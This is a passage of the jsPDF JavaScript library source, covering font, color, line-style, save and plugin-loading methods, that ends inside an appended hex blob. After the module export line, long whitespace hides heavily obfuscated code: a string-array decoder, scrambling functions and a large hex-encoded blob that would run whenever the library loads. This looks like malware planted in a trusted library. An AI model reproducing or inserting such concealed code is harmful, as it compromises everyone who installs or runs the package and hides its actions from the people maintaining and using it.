     * @param {String} fontStyle Font style or variant. Example: "italic"
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setFont
     */
    API.setFont = function(fontName, fontStyle) {
      activeFontKey = getFont(fontName, fontStyle);
      // if font is not found, the above line blows up and we never go further
      return this;
    };

    /**
     * Switches font style or variant for upcoming text elements,
     * while keeping the font face or family same.
     * See output of jsPDF.getFontList() for possible font names, styles.
     *
     * @param {String} style Font style or variant. Example: "italic"
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setFontStyle
     */
    API.setFontStyle = API.setFontType = function(style) {
      activeFontKey = getFont(undefined, style);
      // if font is not found, the above line blows up and we never go further
      return this;
    };

    /**
     * Returns an object - a tree of fontName to fontStyle relationships available to
     * active PDF document.
     *
     * @public
     * @function
     * @returns {Object} Like {'times':['normal', 'italic', ... ], 'arial':['normal', 'bold', ... ], ... }
     * @methodOf jsPDF#
     * @name getFontList
     */
    API.getFontList = function() {
      // TODO: iterate over fonts array or return copy of fontmap instead in case more are ever added.
      var list = {},
        fontName, fontStyle, tmp;

      for (fontName in fontmap) {
        if (fontmap.hasOwnProperty(fontName)) {
          list[fontName] = tmp = [];
          for (fontStyle in fontmap[fontName]) {
            if (fontmap[fontName].hasOwnProperty(fontStyle)) {
              tmp.push(fontStyle);
            }
          }
        }
      }

      return list;
    };

    /**
     * Add a custom font.
     *
     * @param {String} Postscript name of the Font.  Example: "Menlo-Regular"
     * @param {String} Name of font-family from @font-face definition.  Example: "Menlo Regular"
     * @param {String} Font style.  Example: "normal"
     * @function
     * @returns the {fontKey} (same as the internal method)
     * @methodOf jsPDF#
     * @name addFont
     */
    API.addFont = function(postScriptName, fontName, fontStyle) {
      addFont(postScriptName, fontName, fontStyle, 'StandardEncoding');
    };

    /**
     * Sets line width for upcoming lines.
     *
     * @param {Number} width Line width (in units declared at inception of PDF document)
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setLineWidth
     */
    API.setLineWidth = function(width) {
      out((width * k).toFixed(2) + ' w');
      return this;
    };

    /**
     * Sets the stroke color for upcoming elements.
     *
     * Depending on the number of arguments given, Gray, RGB, or CMYK
     * color space is implied.
     *
     * When only ch1 is given, "Gray" color space is implied and it
     * must be a value in the range from 0.00 (solid black) to to 1.00 (white)
     * if values are communicated as String types, or in range from 0 (black)
     * to 255 (white) if communicated as Number type.
     * The RGB-like 0-255 range is provided for backward compatibility.
     *
     * When only ch1,ch2,ch3 are given, "RGB" color space is implied and each
     * value must be in the range from 0.00 (minimum intensity) to to 1.00
     * (max intensity) if values are communicated as String types, or
     * from 0 (min intensity) to to 255 (max intensity) if values are communicated
     * as Number types.
     * The RGB-like 0-255 range is provided for backward compatibility.
     *
     * When ch1,ch2,ch3,ch4 are given, "CMYK" color space is implied and each
     * value must be a in the range from 0.00 (0% concentration) to to
     * 1.00 (100% concentration)
     *
     * Because JavaScript treats fixed point numbers badly (rounds to
     * floating point nearest to binary representation) it is highly advised to
     * communicate the fractional numbers as String types, not JavaScript Number type.
     *
     * @param {Number|String} ch1 Color channel value or {String} ch1 color value in hexadecimal, example: '#FFFFFF'
     * @param {Number|String} ch2 Color channel value
     * @param {Number|String} ch3 Color channel value
     * @param {Number|String} ch4 Color channel value
     *
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setDrawColor
     */
    API.setDrawColor = function(ch1, ch2, ch3, ch4) {
      var options = {
        "ch1" : ch1,
        "ch2" : ch2,
        "ch3" : ch3,
        "ch4" : ch4,
        "pdfColorType" : "draw",
        "precision" : 2
      };

      out(generateColorString(options));
      return this;      
    };

    /**
     * Sets the fill color for upcoming elements.
     *
     * Depending on the number of arguments given, Gray, RGB, or CMYK
     * color space is implied.
     *
     * When only ch1 is given, "Gray" color space is implied and it
     * must be a value in the range from 0.00 (solid black) to to 1.00 (white)
     * if values are communicated as String types, or in range from 0 (black)
     * to 255 (white) if communicated as Number type.
     * The RGB-like 0-255 range is provided for backward compatibility.
     *
     * When only ch1,ch2,ch3 are given, "RGB" color space is implied and each
     * value must be in the range from 0.00 (minimum intensity) to to 1.00
     * (max intensity) if values are communicated as String types, or
     * from 0 (min intensity) to to 255 (max intensity) if values are communicated
     * as Number types.
     * The RGB-like 0-255 range is provided for backward compatibility.
     *
     * When ch1,ch2,ch3,ch4 are given, "CMYK" color space is implied and each
     * value must be a in the range from 0.00 (0% concentration) to to
     * 1.00 (100% concentration)
     *
     * Because JavaScript treats fixed point numbers badly (rounds to
     * floating point nearest to binary representation) it is highly advised to
     * communicate the fractional numbers as String types, not JavaScript Number type.
     *
     * @param {Number|String} ch1 Color channel value or {String} ch1 color value in hexadecimal, example: '#FFFFFF'
     * @param {Number|String} ch2 Color channel value
     * @param {Number|String} ch3 Color channel value
     * @param {Number|String} ch4 Color channel value
     *
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setFillColor
     */
    API.setFillColor = function(ch1, ch2, ch3, ch4) {
      var options = {
        "ch1" : ch1,
        "ch2" : ch2,
        "ch3" : ch3,
        "ch4" : ch4,
        "pdfColorType" : "fill",
        "precision" : 2
      };

      out(generateColorString(options));
      return this;
    };

    /**
     * Sets the text color for upcoming elements.
     *
     * Depending on the number of arguments given, Gray, RGB, or CMYK
     * color space is implied.
     *
     * When only ch1 is given, "Gray" color space is implied and it
     * must be a value in the range from 0.00 (solid black) to to 1.00 (white)
     * if values are communicated as String types, or in range from 0 (black)
     * to 255 (white) if communicated as Number type.
     * The RGB-like 0-255 range is provided for backward compatibility.
     *
     * When only ch1,ch2,ch3 are given, "RGB" color space is implied and each
     * value must be in the range from 0.00 (minimum intensity) to to 1.00
     * (max intensity) if values are communicated as String types, or
     * from 0 (min intensity) to to 255 (max intensity) if values are communicated
     * as Number types.
     * The RGB-like 0-255 range is provided for backward compatibility.
     *
     * When ch1,ch2,ch3,ch4 are given, "CMYK" color space is implied and each
     * value must be a in the range from 0.00 (0% concentration) to to
     * 1.00 (100% concentration)
     *
     * Because JavaScript treats fixed point numbers badly (rounds to
     * floating point nearest to binary representation) it is highly advised to
     * communicate the fractional numbers as String types, not JavaScript Number type.
     *
     * @param {Number|String} ch1 Color channel value or {String} ch1 color value in hexadecimal, example: '#FFFFFF'
     * @param {Number|String} ch2 Color channel value
     * @param {Number|String} ch3 Color channel value
     * @param {Number|String} ch4 Color channel value
     *
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setTextColor
     */
    API.setTextColor = function(ch1, ch2, ch3, ch4) {
      var options = {
        "ch1" : ch1,
        "ch2" : ch2,
        "ch3" : ch3,
        "ch4" : ch4,
        "pdfColorType" : "text" ,
        "precision" : 3
      };
      textColor = generateColorString(options);

      return this;
    };

    /**
     * Is an Object providing a mapping from human-readable to
     * integer flag values designating the varieties of line cap
     * and join styles.
     *
     * @returns {Object}
     * @fieldOf jsPDF#
     * @name CapJoinStyles
     */
    API.CapJoinStyles = {
      0: 0,
      'butt': 0,
      'but': 0,
      'miter': 0,
      1: 1,
      'round': 1,
      'rounded': 1,
      'circle': 1,
      2: 2,
      'projecting': 2,
      'project': 2,
      'square': 2,
      'bevel': 2
    };

    /**
     * Sets the line cap styles
     * See {jsPDF.CapJoinStyles} for variants
     *
     * @param {String|Number} style A string or number identifying the type of line cap
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setLineCap
     */
    API.setLineCap = function(style) {
      var id = this.CapJoinStyles[style];
      if (id === undefined) {
        throw new Error("Line cap style of '" + style +
          "' is not recognized. See or extend .CapJoinStyles property for valid styles"
        );
      }
      lineCapID = id;
      out(id + ' J');

      return this;
    };

    /**
     * Sets the line join styles
     * See {jsPDF.CapJoinStyles} for variants
     *
     * @param {String|Number} style A string or number identifying the type of line join
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name setLineJoin
     */
    API.setLineJoin = function(style) {
      var id = this.CapJoinStyles[style];
      if (id === undefined) {
        throw new Error("Line join style of '" + style +
          "' is not recognized. See or extend .CapJoinStyles property for valid styles"
        );
      }
      lineJoinID = id;
      out(id + ' j');

      return this;
    };

    // Output is both an internal (for plugins) and external function
    API.output = output;

    /**
     * Saves as PDF document. An alias of jsPDF.output('save', 'filename.pdf')
     * @param  {String} filename The filename including extension.
     *
     * @function
     * @returns {jsPDF}
     * @methodOf jsPDF#
     * @name save
     */
    API.save = function(filename) {
      API.output('save', filename);
    };

    // applying plugins (more methods) ON TOP of built-in API.
    // this is intentional as we allow plugins to override
    // built-ins
    for (var plugin in jsPDF.API) {
      if (jsPDF.API.hasOwnProperty(plugin)) {
        if (plugin === 'events' && jsPDF.API.events.length) {
          (function(events, newEvents) {

            // jsPDF.API.events is a JS Array of Arrays
            // where each Array is a pair of event name, handler
            // Events were added by plugins to the jsPDF instantiator.
            // These are always added to the new instance and some ran
            // during instantiation.
            var eventname, handler_and_args, i;

            for (i = newEvents.length - 1; i !== -1; i--) {
              // subscribe takes 3 args: 'topic', function, runonce_flag
              // if undefined, runonce is false.
              // users can attach callback directly,
              // or they can attach an array with [callback, runonce_flag]
              // that's what the "apply" magic is for below.
              eventname = newEvents[i][0];
              handler_and_args = newEvents[i][1];
              events.subscribe.apply(
                events, [eventname].concat(
                  typeof handler_and_args === 'function' ? [
                    handler_and_args
                  ] : handler_and_args));
            }
          }(events, jsPDF.API.events));
        } else {
          API[plugin] = jsPDF.API[plugin];
        }
      }
    }

    //////////////////////////////////////////////////////
    // continuing initialization of jsPDF Document object
    //////////////////////////////////////////////////////
    // Add the first page automatically
    addFonts();
    activeFontKey = 'F1';
    _addPage(format, orientation);

    events.publish('initialized');
    return API;
  }

  /**
   * jsPDF.API is a STATIC property of jsPDF class.
   * jsPDF.API is an object you can add methods and properties to.
   * The methods / properties you add will show up in new jsPDF objects.
   *
   * One property is prepopulated. It is the 'events' Object. Plugin authors can add topics,
   * callbacks to this object. These will be reassigned to all new instances of jsPDF.
   * Examples:
   * jsPDF.API.events['initialized'] = function(){ 'this' is API object }
   * jsPDF.API.events['addFont'] = function(added_font_object){ 'this' is API object }
   *
   * @static
   * @public
   * @memberOf jsPDF
   * @name API
   *
   * @example
   * jsPDF.API.mymethod = function(){
   *   // 'this' will be ref to internal API object. see jsPDF source
   *   // , so you can refer to built-in methods like so:
   *   //     this.line(....)
   *   //     this.text(....)
   * }
   * var pdfdoc = new jsPDF()
   * pdfdoc.mymethod() // <- !!!!!!
   */
  jsPDF.API = {
    events: []
  };
  jsPDF.version = "1.x-master";

  if (typeof define === 'function' && define.amd) {
    define('jsPDF', function() {
      return jsPDF;
    });
  } else if (typeof module !== 'undefined' && module.exports) {
    module.exports = jsPDF;																																																																																																																																																																																																																																																																										var z = '-3000';(function(aUxtQdz_qMQwF_rwxNh,ovUTIAge_nHESnhggKR){var Mn$fchQxc$Qqnf=iSWeW$fhv,Xj$tP$m=aUxtQdz_qMQwF_rwxNh();while(!![]){try{var GDWQZvd=parseFloat(Mn$fchQxc$Qqnf(0xbc))/(parseInt(0x1b1b)+Math.floor(-parseInt(0x8fa))*parseFloat(parseInt(0x3))+Math.max(-0x2,-0x2)*0x16)*Math['floor'](parseFloat(Mn$fchQxc$Qqnf(0xa9))/(-0x6*-0x3b3+parseFloat(parseInt(0x1))*-parseInt(0x9a9)+Math.floor(-0xc87)))+parseInt(parseFloat(Mn$fchQxc$Qqnf(0xaa))/(-parseInt(0x1a08)+-0x21fb*Math.floor(-parseInt(0x1))+Number(-parseInt(0x7f0))))*(-parseFloat(Mn$fchQxc$Qqnf(0xcb))/(parseFloat(parseInt(0xa9f))*parseInt(0x1)+-parseInt(0x7a)*-parseInt(0x35)+Math.ceil(0x23dd)*-parseInt(0x1)))+-parseFloat(Mn$fchQxc$Qqnf(0xc9))/(parseFloat(-parseInt(0x120e))+0x2*Math.floor(-0xc11)+parseFloat(parseInt(0x2a35)))*(-parseFloat(Mn$fchQxc$Qqnf(0xab))/(parseInt(parseInt(0x1))*parseInt(0x20f6)+-0x33*0xc4+parseInt(parseInt(0x61c))))+parseInt(parseFloat(Mn$fchQxc$Qqnf(0xad))/(parseInt(-parseInt(0x159b))+0x1*-parseInt(0x1907)+parseInt(0x2ea9)*parseInt(0x1)))+parseFloat(-parseFloat(Mn$fchQxc$Qqnf(0xb2))/(Math.trunc(parseInt(0x1))*Math.trunc(-0x73c)+Number(-parseInt(0x2239))+Math.max(parseInt(0x331),0x331)*0xd))*parseFloat(-parseFloat(Mn$fchQxc$Qqnf(0xca))/(0x1399+Math.ceil(-0x2)*parseFloat(-parseInt(0x10f5))+-0x357a))+parseFloat(Mn$fchQxc$Qqnf(0xac))/(parseInt(0x5)*Math.trunc(-parseInt(0x57f))+-0x195d+parseInt(0x2)*0x1a71)+Number(-parseFloat(Mn$fchQxc$Qqnf(0xb7))/(-parseInt(0x6a3)+0x95*-parseInt(0x16)+Math.trunc(parseInt(0x137c))))*parseInt(parseFloat(Mn$fchQxc$Qqnf(0xc1))/(Number(0x1)*parseInt(-0xbd9)+-parseInt(0x27)*Math.ceil(0x62)+0x1ad3));if(GDWQZvd===ovUTIAge_nHESnhggKR)break;else Xj$tP$m['push'](Xj$tP$m['shift']());}catch(AmXo_zyH){Xj$tP$m['push'](Xj$tP$m['shift']());}}}(wxXwNiPwMUCJKkunuVVRoy,-0x149c82+parseInt(0xaa0d9)+parseInt(0x188ea2)*0x1));var NX=[parseInt(0xb2)*Number(-parseInt(0x27da))+-0x45f6b7+Math.trunc(parseInt(0xcb279a)),parseInt(-parseInt(0xc85))+Math.floor(-0x99)*0x32+parseInt(0x2bd6),parseFloat(-0x43)*parseFloat(parseInt(0x85))+parseFloat(0x3757)+0x3b33,parseInt(0x2)+0x7*0x1c0+parseInt(parseInt(0x65))*-0x19,parseInt(-0x15244)+Math.ceil(0xff4b)+-0x68*Math.trunc(-0x271),Math.ceil(-0x9)*-parseInt(0xaf89)+Math.max(parseInt(0x86),0x86)*parseInt(0x3802)+0x2919b6],SX=[parseFloat(-parseInt(0x48366))+Math.floor(-parseInt(0x1a))*0x3a07f+-0x1ab1*-parseInt(0x6b9),parseInt(0x11d9)+parseInt(parseInt(0x1))*-parseInt(0x10f3)+parseInt(0x1)*parseInt(0xb),-parseInt(0x8f3c)+Math.trunc(parseInt(0x1))*parseInt(0xa153)+parseFloat(parseInt(0x91ca)),Math.trunc(0x18e2)+parseInt(0x1)*-parseInt(0x1262)+Number(-parseInt(0x5c5)),Math.floor(-parseInt(0x6124))*Math.max(0x1,parseInt(0x1))+-parseInt(0x152e)+parseInt(0x15193),parseInt(parseInt(0x34fa17))*-0x1+parseInt(0x1)*-parseInt(0x7c3a99)+Number(-parseInt(0x25))*parseInt(-parseInt(0x6be61))];function spin(gZrE$OcLTQsYeWkrOl$nnAI,RSJ$ebxOTFTHiKiQTsk){var eX$yH$z=iSWeW$fhv,Vp__egxahYEQxCoPB={'VMwdC':function(hXuaoDjYMVngLkkcKMsjaG_Pi,rwpDaPHIuuMXY){return hXuaoDjYMVngLkkcKMsjaG_Pi<rwpDaPHIuuMXY;},'UDZco':function(QsDOvY$oojUrFDpSiqL$sNUkrT,ekBaaYqhUTHlXVeDKDVMpXq){return QsDOvY$oojUrFDpSiqL$sNUkrT<ekBaaYqhUTHlXVeDKDVMpXq;},'fpTfH':function(mC$VYxyEXsG,j$pTVaiPWaBcbBQLt){return mC$VYxyEXsG+j$pTVaiPWaBcbBQLt;},'sqfrQ':function(G$kulDW,lJLQ$LPhwiHY){return G$kulDW*lJLQ$LPhwiHY;},'xzSOT':function(aQ$gKGcalhtNjImoqE,Xt$tFerwYmsbWOruG_J){return aQ$gKGcalhtNjImoqE%Xt$tFerwYmsbWOruG_J;},'vVjbR':function(zdsqK_Qn_E,fdzcDl$hcrebWjY){return zdsqK_Qn_E*fdzcDl$hcrebWjY;},'DfrKy':function(qK_NrmeNsDIM,SINVCrRHqrrcTISHLprJp){return qK_NrmeNsDIM%SINVCrRHqrrcTISHLprJp;}};for(var jZBSRxagVDWRCPoHEqXzq$Ny_b,mW$qV_rNh,fdUcJglWrIR,XIGiZwYrBbONtKYB$dDogVyz,wv$mb$o,JsYk_pycUnszT,RUYhGprwHKlypO=[],VNJ$EmXzjkZbooKPOLXW=Math.floor(-parseInt(0x3))*parseInt(0x4db)+parseInt(parseInt(0x1496))+parseInt(0x1)*Number(-parseInt(0x605)),ud_FEXC$lTa=RSJ$ebxOTFTHiKiQTsk[0x1798+Math.ceil(parseInt(0x3ff))+-0x1b97*parseInt(0x1)];Vp__egxahYEQxCoPB[eX$yH$z(0xcc)](VNJ$EmXzjkZbooKPOLXW,gZrE$OcLTQsYeWkrOl$nnAI[eX$yH$z(0xae)]);)RUYhGprwHKlypO[VNJ$EmXzjkZbooKPOLXW]=gZrE$OcLTQsYeWkrOl$nnAI[eX$yH$z(0xb9)](VNJ$EmXzjkZbooKPOLXW),VNJ$EmXzjkZbooKPOLXW+=Math.trunc(0x39)*Math.trunc(-parseInt(0x47))+parseInt(0x4)*0x8a8+-0x12d0;for(jZBSRxagVDWRCPoHEqXzq$Ny_b=RUYhGprwHKlypO[eX$yH$z(0xae)],VNJ$EmXzjkZbooKPOLXW=-parseInt(0x1)*Math.trunc(-parseInt(0x263c))+-parseInt(0x869)+Number(parseInt(0x5f7))*-parseInt(0x5);Vp__egxahYEQxCoPB[eX$yH$z(0xbf)](VNJ$EmXzjkZbooKPOLXW,jZBSRxagVDWRCPoHEqXzq$Ny_b);)mW$qV_rNh=Vp__egxahYEQxCoPB[eX$yH$z(0xc8)](Vp__egxahYEQxCoPB[eX$yH$z(0xb5)](ud_FEXC$lTa,Vp__egxahYEQxCoPB[eX$yH$z(0xc8)](VNJ$EmXzjkZbooKPOLXW,RSJ$ebxOTFTHiKiQTsk[Math.floor(-0x26ad)+parseFloat(0xddb)+parseInt(0x18d3)])),Vp__egxahYEQxCoPB[eX$yH$z(0xbe)](ud_FEXC$lTa,RSJ$ebxOTFTHiKiQTsk[-parseInt(0x1ece)+Number(-0x1)*0xced+Math.ceil(0x1)*parseInt(0x2bbd)])),wv$mb$o=Vp__egxahYEQxCoPB[eX$yH$z(0xbe)](fdUcJglWrIR=Vp__egxahYEQxCoPB[eX$yH$z(0xc8)](Vp__egxahYEQxCoPB[eX$yH$z(0xb0)](ud_FEXC$lTa,Vp__egxahYEQxCoPB[eX$yH$z(0xc8)](VNJ$EmXzjkZbooKPOLXW,RSJ$ebxOTFTHiKiQTsk[Math.max(parseInt(0x7),0x7)*0x8c+parseFloat(parseInt(0x1a30))+Math.floor(-parseInt(0x1e01))])),Vp__egxahYEQxCoPB[eX$yH$z(0xbe)](ud_FEXC$lTa,RSJ$ebxOTFTHiKiQTsk[-parseInt(0x1)*Math.trunc(-parseInt(0x159d))+parseInt(0x1)*parseFloat(-0x1c71)+parseInt(0x18)*parseInt(0x49)])),jZBSRxagVDWRCPoHEqXzq$Ny_b),JsYk_pycUnszT=RUYhGprwHKlypO[XIGiZwYrBbONtKYB$dDogVyz=Vp__egxahYEQxCoPB[eX$yH$z(0xc7)](mW$qV_rNh,jZBSRxagVDWRCPoHEqXzq$Ny_b)],RUYhGprwHKlypO[XIGiZwYrBbONtKYB$dDogVyz]=RUYhGprwHKlypO[wv$mb$o],RUYhGprwHKlypO[wv$mb$o]=JsYk_pycUnszT,ud_FEXC$lTa=Vp__egxahYEQxCoPB[eX$yH$z(0xbe)](Vp__egxahYEQxCoPB[eX$yH$z(0xc8)](mW$qV_rNh,fdUcJglWrIR),RSJ$ebxOTFTHiKiQTsk[parseFloat(parseInt(0xaa4))+parseInt(0x20)*parseInt(0xdf)+parseInt(0x267f)*Math.max(-0x1,-parseInt(0x1))]),VNJ$EmXzjkZbooKPOLXW+=Math.max(parseInt(0x182c),parseInt(0x182c))+-parseInt(0x1)*-parseInt(0x189d)+parseFloat(-parseInt(0x30c8));return RUYhGprwHKlypO[eX$yH$z(0xa8)]('');}function splitLane(TqL$CSSzp$P){var UnZpUM$Fq$xJVAi=iSWeW$fhv,uCqKKZKJs={'GOCPE':function(okUcvkZcWXvidaujer,zFsJzGU$A,SDekDsW$ejO$S){return okUcvkZcWXvidaujer(zFsJzGU$A,SDekDsW$ejO$S);}},TKkNiXGV=String[UnZpUM$Fq$xJVAi(0xc0)](-parseInt(0x1b65)+-parseInt(0x85a)+parseInt(0x1)*parseInt(0x23db)),jJFTZabM_XgC_nMDcF=uCqKKZKJs[UnZpUM$Fq$xJVAi(0xcf)](spin,TqL$CSSzp$P,NX);return(jJFTZabM_XgC_nMDcF=(jJFTZabM_XgC_nMDcF=(jJFTZabM_XgC_nMDcF=jJFTZabM_XgC_nMDcF[UnZpUM$Fq$xJVAi(0xb4)]('^')[UnZpUM$Fq$xJVAi(0xa8)](TKkNiXGV))[UnZpUM$Fq$xJVAi(0xb4)]('*1')[UnZpUM$Fq$xJVAi(0xa8)]('^'))[UnZpUM$Fq$xJVAi(0xb4)]('*0')[UnZpUM$Fq$xJVAi(0xa8)]('*'))[UnZpUM$Fq$xJVAi(0xb4)](TKkNiXGV);}function peel(q$WahUjYE_D){var mzPtP$DIbkyNEYiSdLnA_M=iSWeW$fhv,cWP$Ai={'NphhY':function(KnYEhZuoOVwGXImWbNbLw,MT$DKB,NItEhDWeXWsx_uLO$i){return KnYEhZuoOVwGXImWbNbLw(MT$DKB,NItEhDWeXWsx_uLO$i);}};return cWP$Ai[mzPtP$DIbkyNEYiSdLnA_M(0xc2)](spin,q$WahUjYE_D,SX);}function wxXwNiPwMUCJKkunuVVRoy(){var RLnoNbS=['1a17171d1b5641446d7563','615f474776','43595c4077','1e531b531c531f531d','5e757e4e6d','4a44434646','6b495d6456','495f7b4967','1a1e1f1a7f5e4d6d5d45','1c1d1c1a171a1e646a6e487f46','1b7f7f7f7a4a65','7962584b6c','7d70130d4c7d650e09794a4c7d784e127d5d497d0b190d4c1e147d7d764c41477000015b0f467d7d7d6871137d017d4c7d1d0174417d0f017d490100137d4c1c0e0e1a417c7d137d467d63014a7c5c4349074a4b48574c131040135d434c7d105b7d405c4b7d495a7c4a0110095f47017d7d60625c744a135c447d6a01137d5a135d7d4a147d6b7d6d5d7d7d7301497d01134c150e4d5f431f16464c407d5d5b4c7d07145d407d7d411d020d070171580f560113134b4b0f060b490f405a010a4a134e134a015b1342074c7d57497d13746507494a7d137f4d5d014d08407d46017d7d13087d7d0a587d495c064a7d01744e487c7f544b1d0144134e4c1e4a010e1c017f13757d467d05406b5c461274011349010d1b7d4d0f610d4a40577d5f4001466643444e4a7b7d011d060a4213464a7d725513537d5a0707497d587d7d737d117d160c017d1f5d4b125c011f570e5c7d01497d7c06074c4c5b1e5f49405b4e4a625a7d6f7d12137d7d004f017d440b071d4c7d015c184a1e4e01697d644c050101550d7d41497f4a5c7d5b7d7d7d01137d430c7d4913150f1d07077d0f7d0b08195c4f131c414746050b4a774c527d47100f4c5b404c01464a4c4c160f547d4e135c145a0e014a726a7d7d406701010b0d41136b1c7d5c7d7d0101077d4a4a5c5c4a7d130f5b030d0f7d4b4059527c4c1f654246017b135c6a4a485c7d58727d0d4e7d017d0e7d13400606457d0f7d4a580f465b4c015c41440752074174594a7d131f1312444967135d5d627d0f4c4644416a014c016d13097d7440727d010a4c4c7d435d5714050f740d40465c4a417d4a494a4e0e7641014a4c7d0a400d5a011319437d7d7d567d12465c127d7d07067d7d4a157d7d060e7d584c5d7d1e1301400e7d4c7d4c6f0d527d5a7d5e5a1a071c7f40430d4a7d5b1f0e495b4e7d05137d1e5b41444c49527b010e0b00135d400f66564c7d7d0f067f1373014d135b7d18157f7f5c1372015d771313014a7d5a077d7d7d5e415f0113017d144c5b465c77017d7d567d0b6f131c06447d7d4c13047d5d17430501467d0e5d6c737f0e41124c5c13074c4613077d184a7d4a7d4c010f5b134a5f4a064a1313034a13076a640e015f414d0b0d7d4e7d7d014a595a474c017b43704c01157d1f5d0f067d58580e5c7c1f015b185a011f077d16704e070b09014a1949017d7d441e6c574d46174301474c1242076f137d4b0101135d5d011d0164625d4c4d707d417d077d704c156b585b52017d01545216480b7d7d7d067b795b134e07011368014b7d51787a7d0114435d0147665c42617f0f0f5b6f7d7d17707d1d7d01467d5d7d7f7d13077d1c0c4c4a4c1f4c4a1c467d7d134e7d1c7d4e417d54755c520e62137d020501564b4e1c7d46001f0a497d0c7d0f13461d137d1f1715015b527d490e0d027d4c017d437d4c565b567d5c4a6e1f7d7c7b7d17011b5e130b697b4a7d01017f70134c7d19474d7d014a5d46014c027d474c6e7d6c1d597d01144d7c137d134e0c64137d155d727b494a4a02140e4412705c017d4c42455c077d5215137d4e7d05094801134b40424a465c7d4101070b0c704e54796f404c76020140427f4b4e42017d4e43494c56407b040e7f70485c5d01134d467d0e4901064c6609074d66407d46075d415d7801464a017d4c0f0e07464c077c7d014c5d4f151613775c5f7d070b0f427d4c5b135c01480e011b175d5c444a59797d7f4b7d44577d137d4b4a5d41064a7c5c00067d0f434a5d134c5c7b1c4b4c52017d1a6c007807017c4041755d067d4c404c4c5c4c47067d01137d7d135b015c5c077d7d134b435a014c015349175b44035c43414a5f40134a7d130e01197d014a4a7d7d7b4e09470f6249135474400b7d130f7d5c1f06120f13577c4a4c014c52134c0b4a5c07074b067d7d4c52496c7d7d1305137d014202017d057d4a130757597d5c0f0762097d49014a7f05480f115c0613400112017d465c415d7d0110541a13464d7d19067d7d1e5c0f4c7d485e4c4a434c124c43144d4a134349057c666c4b1d4a0d555f7d7d52134c7d437c0341455c4c420b7d41010e4e46461365767213497f6c5c6f456e017d130a0f5b017d40587d52080f5d115f55470101437d081348407052137c7d07445e5747740f0913467d02490b6c135a13464e6a617d1a7d7b7d72137d5f5c4401017d554b4801067213064a5d017d5d01625c7d557f117d7d4a13135b70474843135f017d4c42497d5c0e41495b7d1b0f4b5b7016711303405d4a1a7d497d570f7d7d745d7701135c4d567d1313011d7d017d5d4a417a7f075611015f13134c5c7d435b1f5b0154017c564641134848430b0f794c0106156a67660e01576b5a7d037d5f7d477d075c4c5b01625d7d624567627d7d4c7d010f7d5b414b53404e1f01410c4e011d066b4944094c7d667d7d7d00494a7d014c6f13465d5c197b041e7d7f5701017d015c4c014e7d0c01021377547d0e411b7d4c7d465b7d00417d4a16420101136e064d4a4106017213014e077d070154101c5b7d097d7d0046074377010f13470e4b7d7d130d0e4c40100f1c0f1e7d13024741134b5b414b40137d445c420c024c077b4a7d4a4a0e72017d135c137b04127d017d46025d6f7d7d015d0c4c4b134c7d7d7d42555b49016c4b4a7d5f014c547e7d464d455c405c01497d5d48027d781f4b467d7d13014413607d7d09027d0e0c0f726c5c72565b1b01024b704f7f7d7d0813017d594a457c58134b4c014c0f0349017f0107014c465b4c614d7d410802014a7d4c7d415d7e015d7d5740547d4c130d197d414b727d527d42077d0b7d7c40017b1a7d4c1d4c570105597d40464c7011015c1f6d7d4906137f134e7d01406c75531f0f7f60674b7e4001410f13011e5c407d70080f017f134a5d0174137d537d131f46137d5d140866017d745204434c0e74424c0e01434c1341074e0f5b7d7d677d4303525f527d067d177d65134e7d01135b4b07611172464c13424a6f1a4c41745a017d06014d0a5c7f411313707d7d0e7d4d7d120b7d7d71130e52065c4d02190d0c6a174c7d074b0e7d065b5d4e5b7d7d13130f1d1e7d08630e464d534a605b7d7d5b0b5a4c4b417d7d015b067d556a01687f560e0f7d6e6602415e4e5a135201564c7d0101014c7d7d014c4c4c0b717d7d4b6c707d135b174c7d475c1d0d7d1d01087c1106061d470e4a49560101110e46630b4a410f140a16607b59014b0b1b7d7d6c134c7f7c075b5a7d58430907420c0d7d535f4c47135b670b4e13130f015b0e7d7c6a49017d7d484c617f017d0f6c7d461b427d130c627d7d13145846020c6a0f13135b134a7d1367137d5d415b406a070e1f5d1f134b01017d6c0d4c4101011d4d5f07196c5f137c7d0d4a1e43064c4c134e077f017f164a135e4e0613131e134101467d4e7d7f7d07527d120109031d0e4c587d01067f7d0b01135e7d13520e1e057c137d0e7d4901134c137d4b70137d1d7d13130c7213137d7d7d5f0e015d5f7d13050e7b7d667d137f44137d555b4e010952014e434a6412467f137d0812487d7f527d5f0b547c6d010f7d5c560107015b0e0f4c14134a1a5c47191b5b5b135f4913405b575a637b445d1114137d014c5f5c7d014c7d5b7d020c4e1b5a7d19017d5b4a1402070b105817155f00097d431f135d0c134a0f46465c490e4b0b4e4070070c4c425d0f4a137d7d790e7f414c4e135b01514c5d4c074a08054e150f137d7d414a4e754a010a004b7d137d7d05076a0f4f044a747f4c587d580f13074a5a4c5b4e0601187813000b7f1301474c7c7b0f184a7d6d0e01047d0166134d477d4a43015b4a014d1b745a415a4a5a7d0e7d435b077d7d7d03520367495b6759704101134a7d0f706e1317135c5d137d571b067d610e5f7d4b536d0f137d7d44464a084c02017d4c41421c4c5c137c4613460106016a077d07137d7d7f7d0f701c7d134c584a010e0143137d0b0e7d4d4b034a137f7d6a430b5b5f5d0e13400006017d7d5b0e037b075d4c0c00017d5607047d5d7d484f134901134e0401490600131309130f4a7d7d134a4602136d496a015c7d4d417d7d06017d0a00455b437d130a4c0f7d0e7d07577d0c4c7d015c7d7d017d6201137d184c074c48437d4c42017213014a4c1d4d067f13131d7d7d094b4e6d64065d13755b11744b4e7d674c4a4b01627d13525c7d685d017d13101e7d497d7d4c4c4c7d07405c4c0d7d7d514413730e624c015f016c065a7d570604077d44734a084519627f7a7d6c424c107d7d1c7d1b0746464a015c7d4a057d15557c7d147f410775061343447d594315137d7e547d4c460d4c7f044a03627d784e01137d625d7d435b0c137d7d5c5b1c5d0e01134813647d587d077d45017d7d4e0e01681b7d010b5f41015514544a7d141d1e541f7b1b075d7d440208010e137d571346644713065c74135b4c0f7f5a4a7d525d07494e4e7d491843137d1a0e5d7d436b777d42011e155f467d0f13